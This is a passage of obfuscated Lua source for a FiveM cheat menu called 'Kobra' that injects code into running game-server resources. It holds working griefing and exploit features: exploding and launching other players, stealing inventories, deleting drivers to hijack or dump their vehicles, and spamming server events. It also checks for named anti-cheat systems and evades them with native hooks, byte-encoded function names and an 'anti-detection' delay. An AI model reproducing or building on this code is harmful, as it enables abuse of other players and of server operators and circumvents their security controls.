                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v404));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v405=nil;for v560,v561 in pairs(v27) do if v561 then v405=v560;break;end end if v405 then local v620=0;local v621;local v622;local v623;local v624;while true do if (v620==(4 -1)) then SetEntityHeading(PlayerPedId(),v624);v267:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v405)),v405),3000);break;end if (v620==0) then v621=GetPlayerFromServerId(v405);if ((v621== -(1 + 0)) or  not DoesEntityExist(GetPlayerPed(v621))) then v267:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",6233 -3233 );v27[v405]=nil;v12:UpdateListMenu();return;end v620=3 -2 ;end if (v620==(3 -1)) then v624=GetEntityHeading(v622);SetEntityCoords(PlayerPedId(),v623.x,v623.y,v623.z,false,false,false,false);v620=7 -4 ;end if (v620==(1 + 0)) then v622=GetPlayerPed(v621);v623=GetEntityCoords(v622);v620=531 -(318 + 211) ;end end else v267:Notify("error","Kobra","You must select a player to do this!",14761 -11761 );end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v406) local v407=nil;for v562,v563 in pairs(v27) do if v563 then v407=v562;break;end end v267:HandleSpectateToggle(v407,v406);end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v408={};for v564,v565 in pairs(v27) do if v565 then v408[ #v408 + 1 + 0 ]=v564;end end if ( #v408==(846 -(518 + 328))) then v267:Notify("error","Kobra","You must select a player to do this!",6993 -3993 );return;end local v409=v408[1 -0 ];local v410=GetResourceState("ReaperV4")=="started" ;if v410 then MachoInjectThread(317 -(301 + 16) ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v409));else local function v625(v713) local v714=0 -0 ;local v715;while true do if (v714==0) then v715={};for v1039=2 -1 , #v713 do v715[v1039]=string.byte(v713,v1039);end v714=2 -1 ;end if (v714==(1 + 0)) then return v715;end end end local function v626(v716) local v717="";for v785=1, #v716 do v717=v717   .. string.char(v716[v785]) ;end return v717;end local function v627(v718) local v719=v626(v718);local v720=_G[v719];return v720;end local function v628(v721) local v722=v627(v625("GetActivePlayers"))();for v786,v787 in ipairs(v722) do if (v627(v625("GetPlayerServerId"))(v787)==v721) then return v787;end end return  -(1 + 0);end local function v629(v723) local v724=v628(v723);if (v724== -(1 -0)) then print("^1[ERROR] Client ID not found for Server ID: "   .. v723   .. "^0" );return;end local v725=v627(v625("GetPlayerPed"))(v724);local v726=v627(v625("PlayerPedId"))();if (v627(v625("DoesEntityExist"))(v725) and v627(v625("DoesEntityExist"))(v726)) then local v854=0 + 0 ;while true do if (v854==1) then v627(v625("SetPedComponentVariation"))(v726,1 + 3 ,v627(v625("GetPedDrawableVariation"))(v725,4),v627(v625("GetPedTextureVariation"))(v725,12 -8 ),0 + 0 );v627(v625("SetPedComponentVariation"))(v726,1025 -(829 + 190) ,v627(v625("GetPedDrawableVariation"))(v725,6),v627(v625("GetPedTextureVariation"))(v725,21 -15 ),0);v627(v625("SetPedComponentVariation"))(v726,9 -1 ,v627(v625("GetPedDrawableVariation"))(v725,10 -2 ),v627(v625("GetPedTextureVariation"))(v725,19 -11 ),0);v854=1 + 1 ;end if (v854==2) then v627(v625("SetPedComponentVariation"))(v726,11,v627(v625("GetPedDrawableVariation"))(v725,4 + 7 ),v627(v625("GetPedTextureVariation"))(v725,11),0);v627(v625("SetPedPropIndex"))(v726,0 -0 ,v627(v625("GetPedPropIndex"))(v725,0),v627(v625("GetPedPropTextureIndex"))(v725,0 + 0 ),true);v627(v625("SetPedPropIndex"))(v726,1,v627(v625("GetPedPropIndex"))(v725,614 -(520 + 93) ),v627(v625("GetPedPropTextureIndex"))(v725,1),true);v854=3;end if ((276 -(259 + 17))==v854) then print("^2[Kobra] Copying clothing from Server ID: "   .. v723   .. "^0" );v627(v625("SetPedComponentVariation"))(v726,1 + 0 ,v627(v625("GetPedDrawableVariation"))(v725,1),v627(v625("GetPedTextureVariation"))(v725,1),0 + 0 );v627(v625("SetPedComponentVariation"))(v726,3,v627(v625("GetPedDrawableVariation"))(v725,3),v627(v625("GetPedTextureVariation"))(v725,10 -7 ),591 -(396 + 195) );v854=1;end if (v854==(8 -5)) then v627(v625("SetPedPropIndex"))(v726,1763 -(440 + 1321) ,v627(v625("GetPedPropIndex"))(v725,1831 -(1059 + 770) ),v627(v625("GetPedPropTextureIndex"))(v725,9 -7 ),true);print("^2[Kobra] Clothing copied successfully!^0");break;end end else print("^3[WARNING] Target or local ped does not exist.^0");end end v629(v409);end v267:Notify("success","Kobra","Copied clothing!",5545 -(424 + 121) );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v411=0 + 0 ;local v412;while true do if (v411==(1349 -(641 + 706))) then v267:Notify("success","Kobra","Attempting to TEST",1981 + 3019 );break;end if (v411==0) then v412={};for v788,v789 in pairs(v27) do if v789 then v412[ #v412 + (441 -(249 + 191)) ]=v788;end end v411=1;end if (v411==1) then if ( #v412==(0 -0)) then local v855=0 + 0 ;while true do if (v855==0) then v267:Notify("error","Kobra","You must select a player to do this!",11562 -8562 );return;end end end v267:HandleLaunchPlayer(v412);v411=429 -(183 + 244) ;end end end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v413={};for v566,v567 in pairs(v27) do if v567 then v413[ #v413 + (2 -1) ]=v566;end end if ( #v413==(512 -(169 + 343))) then v267:Notify("error","Kobra","You must select a player to do this!",2630 + 370 );return;end for v568,v569 in ipairs(v413) do local v570=v569;local v571=GetPlayerFromServerId(v569);if ((v571== -(1 -0)) or  not DoesEntityExist(GetPlayerPed(v571))) then local v728=0;while true do if (v728==(2 -1)) then return;end if (v728==0) then v267:Notify("error","Kobra","You must select a player to do this!",3000);v27[v569]=nil;v728=1 + 0 ;end end else local v729=0 -0 ;local v730;while true do if (v729==(1123 -(651 + 472))) then v730=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v570)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v730,v570);v729=1;end if (v729==1) then v267:Notify("success","Kobra","Attempting to Explode Player",3779 + 1221 );break;end end end end v12:UpdateListMenu();end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v414={};for v572,v573 in pairs(v27) do if v573 then v414[ #v414 + 1 ]=v572;end end if ( #v414==0) then v267:Notify("error","Kobra","You must select a player to do this!",3000);return;end v267:HandleTakeInventory(v414);v267:Notify("success","Kobra","Attempting to steal inventory",6102 -1102 );end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v415=0 + 0 ;local v416;while true do if (v415==(1 + 1)) then v267:Notify("success","Kobra","Cloned Player",5000);break;end if (v415==(0 + 0)) then v416={};for v790,v791 in pairs(v27) do if v791 then v416[ #v416 + 1 ]=v790;end end v415=1;end if (v415==(1 + 0)) then if ( #v416==(0 + 0)) then local v856=1190 -(50 + 1140) ;while true do if (v856==0) then v267:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v267:HandleClonePlayer(v416);v415=2 + 0 ;end end end},{type="button",label="Attack Clone Player",onSelect=function() local v417=0 + 0 ;local v418;while true do if ((1 -0)==v417) then if ( #v418==(0 + 0)) then local v857=0;while true do if ((596 -(157 + 439))==v857) then v267:Notify("error","Kobra","You must select a player to do this!",5216 -2216 );return;end end end v267:HandleAttackClonePlayer(v418);v417=2;end if (v417==(6 -4)) then v267:Notify("success","Kobra","Cloned Player",14790 -9790 );break;end if (v417==(918 -(782 + 136))) then v418={};for v792,v793 in pairs(v27) do if v793 then v418[ #v418 + (856 -(112 + 743)) ]=v792;end end v417=1172 -(1026 + 145) ;end end end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v419) local v420=0 + 0 ;local v421;while true do if (v420==1) then if ( #v421==0) then local v858=0;while true do if (v858==(0 + 0)) then v267:Notify("error","Kobra","You must select a player to do this!",2958 + 42 );return;end end end v12:AttachSelectedVehicle(v421,v419);v420=252 -(172 + 78) ;end if (v420==(2 -0)) then v267:Notify("success","Kobra","Vehicle Attached to "   ..  #v421   .. " Player(s)" ,1841 + 3159 );break;end if ((0 -0)==v420) then v421={};for v794,v795 in pairs(v27) do if v795 then v421[ #v421 + 1 + 0 ]=v794;end end v420=1 + 0 ;end end end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=1 -0 ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v422) local v423=0 -0 ;local v424;while true do if (v423==2) then v12:SpawnSelectedObject(v424);break;end if (v423==(1654 -(873 + 781))) then v424={};for v796,v797 in pairs(v27) do if v797 then v424[ #v424 + 1 ]=v796;end end v423=1 -0 ;end if (v423==(2 -1)) then if ( #v424==(0 + 0)) then v267:Notify("error","Kobra","You must select at least one player!",11082 -8082 );return;end v12.GetSelectedObjectModel=function(v798) return v422;end;v423=2 -0 ;end end end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1948 -(414 + 1533) ,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v425) local v426={};for v574,v575 in pairs(v27) do if v575 then v426[ #v426 + (1679 -(136 + 1542)) ]=v574;end end if ( #v426==0) then v267:Notify("error","Kobra","You must select at least one player!",3000);return;end v12.GetSelectedObjectModel=function(v576) return v425;end;v12:SpawnSelectedObject(v426);v267:Notify("success","Kobra","Spawned object '"   .. tostring(v425)   .. "' for "   ..  #v426   .. " player(s)." ,16396 -11396 );end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1 -0 ,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v428) local v429={};for v577,v578 in pairs(v27) do if v578 then v429[ #v429 + 1 ]=v577;end end if ( #v429==0) then v267:Notify("error","Kobra","You must select at least one player!",4495 -1495 );return;end v12.GetSelectedObjectModel=function(v579) return v428;end;v12:SpawnSelectedObject(v429);end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v431) local v432={};for v580,v581 in pairs(v27) do if v581 then v432[ #v432 + 1 ]=v580;end end if ( #v432==(0 -0)) then local v630=0;while true do if (v630==0) then v267:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v582) return v431;end;v12:SpawnSelectedObject(v432);v267:Notify("success","Kobra","Spawned object '"   .. tostring(v431)   .. "' for "   ..  #v432   .. " player(s)." ,5831 -(762 + 69) );end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v434=nil;for v583,v584 in pairs(v27) do if v584 then v434=v583;break;end end if v434 then local v631=GetPlayerFromServerId(v434);if (v631== -(1 + 0)) then v267:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",7256 -4256 );v27[v434]=nil;v12:UpdateListMenu();return;end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v631))) then v267:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",3000);return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v859=1,1 + 1  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v631))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v434]=true;v267:UpdateListMenu();else v267:Notify("error","Kobra","You must select a player to do this!",48 + 2952 );end end},{type="button",label="Teleport to Ocean",onSelect=function() local v435=157 -(8 + 149) ;local v436;while true do if (v435==(1321 -(1199 + 121))) then if v436 then local v860=GetPlayerFromServerId(v436);if (v860== -(1 -0)) then v267:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",6773 -3773 );v27[v436]=nil;v12:UpdateListMenu();return;end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v860))) then local v1042=0 + 0 ;while true do if (v1042==0) then v267:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",10708 -7708 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1125=2 -1 ,2 + 0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v860))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v436]=true;v267:UpdateListMenu();else v267:Notify("error","Kobra","You must select a player to do this!",3000);end break;end if (v435==0) then v436=nil;for v800,v801 in pairs(v27) do if v801 then v436=v800;break;end end v435=1;end end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v437) if v437 then print("Console Spam Started...");v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
